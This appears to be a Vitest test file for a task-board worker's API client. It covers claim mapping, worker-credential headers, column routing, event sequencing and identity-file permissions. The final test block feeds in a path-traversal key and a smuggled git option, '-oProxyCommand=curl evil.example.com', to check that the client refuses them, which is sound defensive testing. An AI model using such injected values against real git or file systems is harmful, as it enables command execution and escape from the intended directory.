import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { describe, it, expect, vi, afterAll } from "vitest";
import { createApiClient } from "./api.js";

const config = {
  apiBaseUrl: "https://app.example.com",
  apiToken: "cp_token",
  workerId: "worker-a",
} as never;

// A stored identity, injected in place of the real <stateDir>/worker.json so claim() (the only
// method that needs one) can authenticate without touching the filesystem
const identityStore = { read: () => JSON.stringify({ workerId: "w1", credential: "cpw_secret" }) };

// Every claim now carries the agent the server resolved; a claim without one is not runnable and
// is handed straight back, so a fixture that omits it tests the refusal rather than the mapping.
const agent = {
  agentId: "a1",
  name: "Default",
  sequence: [
    { key: "implement", kind: "step", name: "Implement", prompt: "do it", capability: "edit" },
  ],
};

describe("createApiClient", () => {
  it("returns null when the claim endpoint reports an empty queue", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(config, fetchMock as never, identityStore);
    expect(await api.claim("CP", "run-1")).toBeNull();
  });

  it("maps a claimed task onto ClaimedTask", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        _id: "t1",
        agent,
        project: "CP",
        taskNumber: 158,
        title: "Do the thing",
        description: "body",
        checklist: [{ text: "first", done: false }],
        execution: { attempts: 1, runId: "run-on-the-task" },
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    const task = await api.claim("CP", "run-1");

    // Every optional field of an entry is filled in, so nothing downstream has to decide what an
    // absent capability or model means
    expect(task?.agent.sequence[0]).toEqual({
      key: "implement",
      kind: "step",
      name: "Implement",
      prompt: "do it",
      capability: "edit",
      model: "",
      fallbackModel: "",
      deterministic: false,
      gateKind: "",
      params: {},
    });
    expect(task).toEqual({
      taskId: "t1",
      agent: task?.agent,
      projectId: "CP",
      taskKey: "CP-158",
      taskNumber: 158,
      title: "Do the thing",
      description: "body",
      acceptanceCriteria: ["first"],
      attempts: 1,
      runId: "run-on-the-task",
    });
  });

  it("falls back to the run it proposed when the response carries none", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ _id: "t1", agent, taskNumber: 158, title: "Do the thing", description: "" }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.claim("CP", "run-1"))?.runId).toBe("run-1");
  });

  it("falls back to the id used to claim when the task carries no project field", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ _id: "t1", agent, taskNumber: 158, title: "Do the thing", description: "" }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    const task = await api.claim("CP", "run-1");

    expect(task?.projectId).toBe("CP");
  });

  it("reads the agent the claim resolved, in order and with its parameters", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        _id: "t1",
        taskNumber: 1,
        title: "t",
        description: "",
        agent: {
          agentId: "a1",
          name: "Default",
          sequence: [
            { key: "implement", kind: "step", name: "Implement", capability: "edit" },
            {
              key: "size-strict",
              kind: "gate",
              name: "Size",
              gateKind: "diff-size",
              params: { maxLines: "400" },
            },
          ],
        },
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    const task = await api.claim("CP", "run-1");

    expect(task?.agent.sequence.map((entry) => entry.key)).toEqual(["implement", "size-strict"]);
    expect(task?.agent.sequence[1].params).toEqual({ maxLines: "400" });
  });

  // A claim that cannot be run must be handed back. Returning null alone holds the task until
  // EXECUTION_LEASE_MS expires — two hours in the active column with nothing to say why.
  it("releases the task when the claim carries no agent", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ _id: "t1", taskNumber: 1, title: "t", description: "" }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await expect(api.claim("CP", "run-1")).resolves.toBeNull();
    expect(String(fetchMock.mock.calls.at(-1)?.[0])).toContain("/tasks/t1/release");
  });

  // Skipping the bad entry would run a shorter agent than the one somebody composed, and a missing
  // check looks exactly like a check that passed
  it("refuses the whole agent when one entry is malformed, rather than dropping it", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        _id: "t1",
        taskNumber: 1,
        title: "t",
        description: "",
        agent: {
          agentId: "a1",
          name: "Default",
          sequence: [
            { key: "implement", kind: "step", name: "Implement" },
            { key: "diff-size", kind: "checkpoint", name: "Size" },
          ],
        },
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await expect(api.claim("CP", "run-1")).resolves.toBeNull();
  });

  it("claims against the project-scoped url", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await api.claim("CP", "run-1");

    const [url] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP/tasks/claim");
  });

  // CP-237: one credential for everything. A project-scoped API token could not follow a grant
  // that is recomputed every heartbeat, so a second project silently 403'd the report while the
  // claim succeeded.
  it("reports status on the worker credential, never a separate api token", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await api.setStatus("CP", "t1", "done");
    const init = fetchMock.mock.calls[0][1];
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
    expect(init.headers["X-CP-Protocol"]).toBe("1");
  });

  it("sends the worker credential, X-Worker-Id and X-CP-Protocol on claim, not the api token", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await api.claim("CP", "run-1");
    const init = fetchMock.mock.calls[0][1];
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
    expect(init.headers["X-CP-Protocol"]).toBe("1");
  });

  it("sends only runId in the claim body — the credential identifies the worker", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await api.claim("CP", "run-1");
    const init = fetchMock.mock.calls[0][1];
    expect(init.body).toBe(JSON.stringify({ runId: "run-1" }));
  });

  it("refuses to claim, without a network call, when no identity is stored", async () => {
    const fetchMock = vi.fn();
    const api = createApiClient(config, fetchMock as never, { read: () => "" });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(api.claim("CP", "run-1")).rejects.toThrow(/not registered/);

    expect(fetchMock).not.toHaveBeenCalled();
    errorSpy.mockRestore();
  });

  it("logs that the worker is not registered only once, even after repeated 401s", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: false, status: 401, text: async () => "" });
    const api = createApiClient(config, fetchMock as never, identityStore);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(api.claim("CP", "run-1")).rejects.toThrow();
    await expect(api.claim("CP", "run-2")).rejects.toThrow();

    expect(errorSpy).toHaveBeenCalledTimes(1);
    expect(errorSpy).toHaveBeenCalledWith(expect.stringMatching(/not registered/));
    errorSpy.mockRestore();
  });

  it("throws on a non-ok response", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: false, status: 500, text: async () => "boom" });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await expect(api.claim("CP", "run-1")).rejects.toThrow(/500/);
  });

  it("sends the status via PATCH", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.setStatus("CP", "t1", "done");

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP/tasks/t1/status");
    expect(init.method).toBe("PATCH");
    expect(init.body).toBe(JSON.stringify({ status: "done" }));
  });

  it("sends the comment via POST on the worker credential", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 201 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.comment("CP", "t1", "hello");

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP/tasks/t1/comments");
    expect(init.method).toBe("POST");
    expect(init.body).toBe(JSON.stringify({ body: "hello" }));
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
  });

  it("drops checklist items without a string text field", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        _id: "t1",
        agent,
        taskNumber: 158,
        title: "Do the thing",
        description: "body",
        checklist: [{ text: "first" }, { done: true }, { text: 42 }],
        execution: { attempts: 1 },
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    const task = await api.claim("CP", "run-1");

    expect(task?.acceptanceCriteria).toEqual(["first"]);
  });

  it("releases via POST with no body, so the server owns the target column", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.release("CP", "t1");

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP/tasks/t1/release");
    expect(init.method).toBe("POST");
    expect(init.body).toBeUndefined();
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
  });

  it("lists the ids of every column the board carries", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [
          { id: "ready", role: "approved", order: 1 },
          { id: "doing", role: "active", order: 2 },
          { id: 7, role: "broken" },
        ],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.columnIds("CP")).toEqual(["ready", "doing"]);
  });

  // A project stored before the seeding migration carries no columns of its own, and the server
  // routes it on the built-in seven. A worker that read that as "no columns" would refuse to work
  // on a board the server handles perfectly well
  it("reads a board with no columns of its own as the seeded seven", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200, json: async () => ({ columns: [] }) });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.columnIds("CP")).toEqual([
      "planned",
      "todo",
      "in_progress",
      "in_review",
      "needs_human_review",
      "ready_to_test",
      "done",
    ]);
  });

  it("routes a board with no columns of its own to the seeded ids", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200, json: async () => ({}) });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.statusIds("CP")).toEqual({
      approved: "todo",
      review: "needs_human_review",
      done: "done",
    });
  });

  it("charges the attempt when the release asks not to refund it", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.release("CP", "t1", { refund: false });

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP/tasks/t1/release");
    expect(init.body).toBe(JSON.stringify({ refund: false }));
  });

  it("maps a customised board's roles onto its own ids", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [
          { id: "ready", role: "approved", order: 1 },
          { id: "doing", role: "active", order: 2 },
          { id: "checking", role: "review", order: 3 },
          { id: "shipped", role: "done", order: 4 },
        ],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.statusIds("CP")).toEqual({
      approved: "ready",
      review: "checking",
      done: "shipped",
    });
  });

  it("prefers the review column the board flags for human review", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [
          { id: "checking", role: "review", order: 1 },
          { id: "escalated", role: "review", order: 2, triggersPmReview: true },
          { id: "verifying", role: "review", order: 3 },
        ],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.statusIds("CP")).review).toBe("escalated");
  });

  it("routes the seeded board to the column the PM automation watches", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [
          { id: "planned", role: "backlog", order: 0 },
          { id: "todo", role: "approved", order: 1 },
          { id: "in_progress", role: "active", order: 2 },
          { id: "in_review", role: "review", order: 3 },
          { id: "needs_human_review", role: "review", order: 4, triggersPmReview: true },
          { id: "ready_to_test", role: "review", order: 5 },
          { id: "done", role: "done", order: 6 },
        ],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.statusIds("CP")).toEqual({
      approved: "todo",
      review: "needs_human_review",
      done: "done",
    });
  });

  it("reads the columns in board order, not storage order", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [
          { id: "late", role: "review", order: 9 },
          { id: "early", role: "review", order: 2 },
        ],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.statusIds("CP")).review).toBe("early");
  });

  it("falls back to the seeded ids when a role is absent", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ columns: [{ id: "doing", role: "active", order: 1 }] }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.statusIds("CP")).toEqual({
      approved: "todo",
      review: "needs_human_review",
      done: "done",
    });
  });

  it("falls back for a board that predates column seeding", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({}),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.statusIds("CP")).toEqual({
      approved: "todo",
      review: "needs_human_review",
      done: "done",
    });
  });

  it("ignores malformed column entries instead of throwing", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        columns: [null, { role: "done" }, { id: 7, role: "done" }, { id: "shipped", role: "done" }],
      }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.statusIds("CP")).done).toBe("shipped");
  });

  // Was misnamed "...a worker token can reach" — it is the api token, like every other
  // project-scoped call; only claim() uses the worker credential
  it("reads columns on the worker credential", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ columns: [] }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.statusIds("CP");

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/projects/CP");
    expect(init.method).toBe("GET");
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
    expect(init.headers["X-CP-Protocol"]).toBe("1");
  });

  it("reads columns for columnIds on the worker credential too", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ columns: [] }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.columnIds("CP");

    const [, init] = fetchMock.mock.calls[0];
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
  });

  it("posts a phase event to the worker's own events endpoint, not a project one", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.postEvent({ taskId: "t1", runId: "run-1", phase: "gates:build" });

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toBe("https://app.example.com/api/workers/w1/events");
    expect(init.method).toBe("POST");
    expect(JSON.parse(init.body)).toEqual({
      taskId: "t1",
      runId: "run-1",
      phase: "gates:build",
      seq: 1,
    });
  });

  it("posts a phase event with the worker credential, not the api token", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.postEvent({ taskId: "t1", runId: "run-1", phase: "agent" });

    const init = fetchMock.mock.calls[0][1];
    expect(init.headers.Authorization).toBe("Bearer cpw_secret");
    expect(init.headers["X-Worker-Id"]).toBe("w1");
    expect(init.headers["X-CP-Protocol"]).toBe("1");
  });

  // The one thing the run can learn from a phase post: the server wrote nothing, because the task
  // is no longer this run's. Discarding the answer is what let a detached run keep working.
  it("returns what the server did with the event", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ applied: false }),
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.postEvent({ taskId: "t1", runId: "run-1", phase: "agent" })).toEqual({
      applied: false,
    });
  });

  // The caller ends the run on a refusal, so anything short of an explicit false — a proxy's error
  // page, a server with no such field — has to read as applied
  it("treats a body it cannot read as applied rather than as a refusal", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => {
        throw new SyntaxError("Unexpected token < in JSON at position 0");
      },
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect(await api.postEvent({ taskId: "t1", runId: "run-1", phase: "agent" })).toEqual({
      applied: true,
    });
  });

  // The server keeps the highest seq it has seen and drops the rest, so the order events were
  // reported in has to survive a network that reorders them
  it("stamps each event with a seq that only goes up", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 200 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.postEvent({ taskId: "t1", runId: "run-1", phase: "worktree" });
    await api.postEvent({ taskId: "t1", runId: "run-1", phase: "agent" });
    await api.postEvent({ taskId: "t1", runId: "run-1", phase: "gates:build" });

    const seqs = fetchMock.mock.calls.map(([, init]) => JSON.parse(init.body).seq);
    expect(seqs).toEqual([1, 2, 3]);
  });

  it("refuses to post an event, without a network call, when no identity is stored", async () => {
    const fetchMock = vi.fn();
    const api = createApiClient(config, fetchMock as never, { read: () => "" });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(api.postEvent({ taskId: "t1", runId: "run-1", phase: "agent" })).rejects.toThrow(
      /not registered/
    );

    expect(fetchMock).not.toHaveBeenCalled();
    errorSpy.mockRestore();
  });

  it("still reports the status when reading the error body fails", async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: false,
      status: 500,
      text: async () => {
        throw new Error("stream closed");
      },
    });
    const api = createApiClient(config, fetchMock as never, identityStore);
    await expect(api.claim("CP", "run-1")).rejects.toThrow(/500/);
  });
});

describe("createApiClient — more than one project", () => {
  function fetchFor(projects: Record<string, { key: string; columns: unknown[] }>) {
    return vi.fn().mockImplementation(async (url: string) => {
      const match = /\/api\/projects\/([^/]+)/.exec(String(url));
      const projectId = match?.[1] ?? "";
      if (String(url).endsWith("/tasks/claim")) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            _id: `t-${projectId}`,
            agent,
            project: projectId,
            taskNumber: 1,
            title: "Do the thing",
            description: "",
          }),
        };
      }
      return { ok: true, status: 200, json: async () => projects[projectId] };
    });
  }

  it("keys each project's tasks from that project's own key, cached independently", async () => {
    const fetchMock = fetchFor({
      A: { key: "ALPHA", columns: [] },
      B: { key: "BETA", columns: [] },
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.claim("A", "run-1"))?.taskKey).toBe("ALPHA-1");
    expect((await api.claim("B", "run-1"))?.taskKey).toBe("BETA-1");

    // Reading each project's key once, however many tasks are claimed from it
    await api.claim("A", "run-2");
    const projectReads = fetchMock.mock.calls.filter(([url]) => !String(url).endsWith("/tasks/claim"));
    expect(projectReads).toHaveLength(2);
  });

  it("keeps a claimed task moving on the id used to claim when the project cannot be read", async () => {
    const fetchMock = vi.fn().mockImplementation(async (url: string) => {
      if (String(url).endsWith("/tasks/claim")) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ _id: "t1", agent, taskNumber: 158, title: "Do the thing", description: "" }),
        };
      }
      return { ok: false, status: 503, text: async () => "down" };
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    expect((await api.claim("69a52e3b399b27d3cbb2c5a5", "run-1"))?.taskKey).toBe(
      "69a52e3b399b27d3cbb2c5a5-158"
    );
  });

  it("does not read a project at all while its queue is empty", async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(config, fetchMock as never, identityStore);

    await api.claim("A", "run-1");

    expect(fetchMock).toHaveBeenCalledTimes(1);
  });
});

// No identitySource override here — these exercise the real, file-backed reader the constructor
// falls back to, the same as production. The same mode discipline as config.test.ts's secret-file
// tests and repos.test.ts's createAllowlistReader tests.
describe("createApiClient's default identity file", () => {
  const dir = mkdtempSync(join(tmpdir(), "cp-api-test-"));

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("reads worker.json when only its owner can read it", async () => {
    const path = join(dir, "worker.json");
    writeFileSync(path, JSON.stringify({ workerId: "w1", credential: "cpw_from_disk" }));
    chmodSync(path, 0o600);
    const cfg = { ...config, stateDir: dir } as never;
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, status: 204 });
    const api = createApiClient(cfg, fetchMock as never);

    await api.claim("CP", "run-1");

    const init = fetchMock.mock.calls[0][1];
    expect(init.headers.Authorization).toBe("Bearer cpw_from_disk");
  });

  it("refuses a worker.json readable by group or others, the same as config.ts's secret file", async () => {
    // Its own subdirectory: fileIdentityReader always looks for <stateDir>/worker.json, so this
    // case cannot share a directory with the mode-0600 happy path above
    const looseDir = join(dir, "loose");
    mkdirSync(looseDir);
    const path = join(looseDir, "worker.json");
    writeFileSync(path, JSON.stringify({ workerId: "w1", credential: "cpw_x" }));
    chmodSync(path, 0o644);
    const cfg = { ...config, stateDir: looseDir } as never;
    const fetchMock = vi.fn();
    const api = createApiClient(cfg, fetchMock as never);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(api.claim("CP", "run-1")).rejects.toThrow(/readable by group or others/);

    expect(fetchMock).not.toHaveBeenCalled();
    errorSpy.mockRestore();
  });

  it("treats a missing worker.json as not registered, not a permission error", async () => {
    const cfg = { ...config, stateDir: join(dir, "does-not-exist") } as never;
    const fetchMock = vi.fn();
    const api = createApiClient(cfg, fetchMock as never);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(api.claim("CP", "run-1")).rejects.toThrow(/not registered/);

    errorSpy.mockRestore();
  });
});

// The one test that notices the seam. worker/tsconfig.json excludes src/**/*.test.ts and vitest
// transpiles without typechecking, so a ClaimedTask.runId that is never populated raises no error
// anywhere: every other fixture would simply carry `undefined` and every server-side test would
// still pass on its own hand-written value.
describe("the run identity, from claim through to postEvent", () => {
  it("posts the run the server recorded on the task, not the one the claim proposed", async () => {
    const fetchMock = vi.fn().mockImplementation(async (url: string) => {
      if (String(url).endsWith("/tasks/claim")) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            _id: "t1",
        agent,
            taskNumber: 158,
            title: "Do the thing",
            description: "",
            execution: { attempts: 1, runId: "run-the-server-recorded" },
          }),
        };
      }
      return { ok: true, status: 200, json: async () => ({ key: "CP" }) };
    });
    const api = createApiClient(config, fetchMock as never, identityStore);

    const task = await api.claim("CP", "run-the-worker-proposed");
    expect(task).not.toBeNull();
    await api.postEvent({ taskId: task!.taskId, runId: task!.runId, phase: "agent" });

    const [url, init] = fetchMock.mock.calls[fetchMock.mock.calls.length - 1];
    expect(url).toBe("https://app.example.com/api/workers/w1/events");
    expect(JSON.parse(init.body).taskId).toBe("t1");
    expect(JSON.parse(init.body).runId).toBe("run-the-server-recorded");
  });
});

describe("task keys the worker cannot name safely", () => {
  function clientFor(projectKey: string) {
    const fetchMock = vi.fn().mockImplementation(async (url: string) => {
      if (String(url).endsWith("/tasks/claim")) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ _id: "t1", agent, taskNumber: 1, title: "Do the thing", description: "" }),
        };
      }
      return { ok: true, status: 200, json: async () => ({ key: projectKey }) };
    });
    return { api: createApiClient(config, fetchMock as never, identityStore), fetchMock };
  }

  it("refuses a key that would traverse out of the worktree root", async () => {
    const { api } = clientFor("../escape");
    await expect(api.claim("p1", "run-1")).rejects.toThrow(/\.\.\/escape-1/);
  });

  it("refuses a key git would read as an option rather than a branch", async () => {
    const { api } = clientFor("-oProxyCommand=curl evil.example.com");
    await expect(api.claim("p1", "run-1")).rejects.toThrow(/ProxyCommand/);
  });

  it("hands the refused task back with the attempt charged", async () => {
    const { api, fetchMock } = clientFor("../escape");
    await expect(api.claim("p1", "run-1")).rejects.toThrow();

    const release = fetchMock.mock.calls.find(([url]) =>
      String(url).endsWith("/api/projects/p1/tasks/t1/release")
    );
    expect(release).toBeDefined();
    expect(JSON.parse(release![1].body)).toEqual({ refund: false });
  });

  it("accepts an ordinary key", async () => {
    const { api } = clientFor("BP");
    expect((await api.claim("p1", "run-1"))?.taskKey).toBe("BP-1");
  });
});
